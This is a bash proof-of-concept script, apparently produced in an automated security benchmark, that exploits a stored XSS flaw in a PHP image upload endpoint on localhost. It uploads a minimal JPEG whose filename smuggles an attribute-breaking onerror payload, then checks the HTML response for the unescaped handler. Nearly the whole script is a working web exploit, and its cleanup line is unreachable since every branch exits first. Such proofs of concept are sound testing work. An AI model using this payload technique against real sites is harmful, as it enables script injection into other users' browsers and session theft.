#!/bin/bash
# POC: Demonstrates Stored XSS vulnerability through image filename upload. Uses a valid minimal JPEG file and uploads with XSS payload in filename, verifying the payload is reflected unescaped in HTML.
# Target: ./repo
# Created: 2025-11-07T17:10:38.953Z
# Session: benchmark-XBEN-067-24-mhp3pdwz

# Stored XSS in Image Filename Upload POC (Version 2)
# Creates a minimal valid JPG file and uploads with XSS payload in filename

TARGET="${1:-http://localhost:8080}"
ENDPOINT="/index.php"
UPLOAD_URL="${TARGET}${ENDPOINT}"

echo "[*] Stored XSS in Image Filename Upload POC v2"
echo "[*] Target: $UPLOAD_URL"
echo ""

# Create a minimal valid JPEG file
# This is the smallest valid JPG file (JPEG SOI marker + EOI marker)
TEST_IMAGE=$(mktemp --suffix=.jpg)
printf '\xFF\xD8\xFF\xD9' > "$TEST_IMAGE"
echo "[+] Created valid minimal JPEG file: $TEST_IMAGE"
echo ""

# Prepare the XSS payload in the filename
# Using format: x" onerror="alert('XSS')
XSS_PAYLOAD='x" onerror="alert('"'"'XSS'"'"')'
FILENAME="${XSS_PAYLOAD}.jpg"

echo "[*] Uploading file with XSS payload in filename..."
echo "[*] Payload: $FILENAME"
echo ""

# Perform the upload
RESPONSE=$(curl -s -F "userfile=@${TEST_IMAGE};filename=${FILENAME}" \
  -F "submit=Upload Image" \
  "$UPLOAD_URL")

echo "[+] Response received:"
echo "---"
echo "$RESPONSE"
echo "---"
echo ""

# Check if the XSS payload appears unescaped in the HTML response
if echo "$RESPONSE" | grep -q 'onerror="alert'; then
    echo "[✓] VULNERABLE: Unescaped XSS payload found in HTML response!"
    echo "[✓] The payload 'onerror=\"alert' appears in the HTML without proper encoding"
    echo ""
    
    # Show the exact vulnerable HTML
    echo "[*] Vulnerable HTML snippet:"
    echo "$RESPONSE" | grep -o '<img[^>]*onerror[^>]*>' | head -1
    echo ""
    
    echo "[✓] EXPLOITATION CONFIRMED: The JavaScript event handler will execute"
    exit 0
elif echo "$RESPONSE" | grep -q 'onerror=%22alert'; then
    echo "[✓] VULNERABLE: URL-encoded XSS payload found (still exploitable)!"
    echo "[✓] The payload appears as 'onerror=%22alert' which decodes to 'onerror=\"alert'"
    echo ""
    
    # Show the exact vulnerable HTML
    echo "[*] Vulnerable HTML snippet:"
    echo "$RESPONSE" | grep -o '<img[^>]*>' | head -1
    echo ""
    
    echo "[✓] EXPLOITATION CONFIRMED: Browser will decode and execute the payload"
    exit 0
elif echo "$RESPONSE" | grep -q "onerror"; then
    echo "[✓] VULNERABLE: onerror event handler found in response!"
    echo "[*] The payload appears in the HTML response"
    echo "$RESPONSE" | grep -o '<img[^>]*>' | head -1
    exit 0
else
    echo "[-] Could not confirm vulnerability in response"
    echo "[*] Response does not contain onerror event handler"
    
    # Check if img tag exists at all
    if echo "$RESPONSE" | grep -q '<img'; then
        echo "[*] HTML img tags found - showing them:"
        echo "$RESPONSE" | grep -o '<img[^>]*>' | head -3
    else
        echo "[-] No img tags found in response"
    fi
    exit 1
fi

# Cleanup
rm -f "$TEST_IMAGE"